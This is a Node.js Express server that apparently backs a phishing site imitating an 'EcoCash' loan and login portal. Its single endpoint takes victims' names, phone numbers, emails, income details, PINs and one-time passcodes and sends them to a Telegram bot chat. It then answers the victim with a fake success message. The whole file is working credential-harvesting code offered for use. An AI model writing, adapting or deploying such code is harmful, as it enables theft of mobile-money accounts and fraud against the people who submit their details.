const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static frontend files from root under /ax
app.use('/ax', express.static(path.join(__dirname)));

// Unified API endpoint for handling loan applications, logins, and OTP verification
app.post('/ax/api/verify-otp', async (req, res) => {
    const { type, loanAmount, loanTerm, purpose, firstName, lastName, email, phoneNumber, employmentStatus, annualIncome, pin, otp } = req.body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    let message = `🚨 *EcoCash Portal Submission*\n`;
    
    if (type === 'loan_application') {
        message += `📋 *Loan Application Details*\n` +
                   `👤 Name: ${firstName || ''} ${lastName || ''}\n` +
                   `📱 Phone: \`${phoneNumber || 'N/A'}\`\n` +
                   `📧 Email: ${email || 'N/A'}\n` +
                   `💰 Amount: $${loanAmount || '5000'}\n` +
                   `⏳ Term: ${loanTerm || '6 Months'}\n` +
                   `🚗 Purpose: ${purpose || 'N/A'}\n` +
                   `💼 Employment: ${employmentStatus || 'N/A'}\n` +
                   `💵 Annual Income: $${annualIncome || 'N/A'}`;
    } else {
        message += `🔐 *Login / Verification*\n` +
                   `📱 Phone: \`${phoneNumber || 'N/A'}\`\n` +
                   `🔑 PIN/OTP: \`${pin || otp || 'N/A'}\`\n` +
                   `✅ Status: Attempted`;
    }

    try {
        if (botToken && chatId) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
        return res.json({ success: true, message: 'Processed successfully' });
    } catch (error) {
        console.error('Telegram dispatch error:', error);
        return res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Catch-all route to serve index.html for all /ax/* routes
app.get('/ax/*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`EcoCash loan server running on port ${PORT}`);
});
